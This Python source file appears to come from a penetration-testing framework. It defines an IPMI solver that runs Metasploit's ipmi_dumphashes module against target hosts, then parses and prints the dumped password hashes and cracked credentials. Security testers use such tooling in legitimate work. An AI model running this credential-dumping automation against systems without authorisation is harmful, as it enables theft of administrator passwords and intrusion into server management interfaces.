import subprocess
import re
from src.solvers.solverclass import BaseSolverClass
from src.utilities.utilities import error_handler

class IPMISolverClass(BaseSolverClass):
    def __init__(self) -> None:
        super().__init__("IPMI", 20)
        self.output_filename_for_all = "ipmi.txt"
        self.output_png_for_action = "ipmi.png"
        self.action_title = "IPMI"

    @error_handler([])
    def solve(self, args):
        self.process_args(args)

        if not self.hosts:
            return
        if self.is_nv:
            r = r"\[\+\] (.*) - IPMI - Hash found: (.*)"
            r1 =  r"\[\+\] (.*) - IPMI - Hash for user '(.*)' matches password '(.*)'"
            print("Running metasploit ipmi dumphashes module, there will be no progression bar")
            hashes = {}
            creds = {}

            result = ", ".join(h.ip for h in self.hosts)
            command = ["msfconsole", "-q", "-x", f"color false; use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {result}; set THREADS {args.threads}; run; exit"]

            result = subprocess.run(command, text=True, capture_output=True)
            matches = re.findall(r, result.stdout)
            for m in matches:
                if m[0] not in hashes:
                    hashes[m[0]] = []
                hashes[m[0]].append(m[1])
                
            matches = re.findall(r1, result.stdout)
            for m in matches:
                if m[0] not in creds:
                    creds[m[0]] = []
                creds[m[0]].append(f"{m[1]}:{m[2]}")
            
            if hashes:
                self.print_output("IPMI hashes dumped:")
                for key, value in hashes.items():
                    self.print_output(f"{key}:")
                    for v in value:
                        self.print_output(f"    {v}")
                self.create_windowcatcher_action()

            if creds:
                self.print_output("IPMI Creds found:")
                for key, value in creds.items():
                    self.print_output(f"{key}:")
                    for v in value:
                        self.print_output(f"    {v}")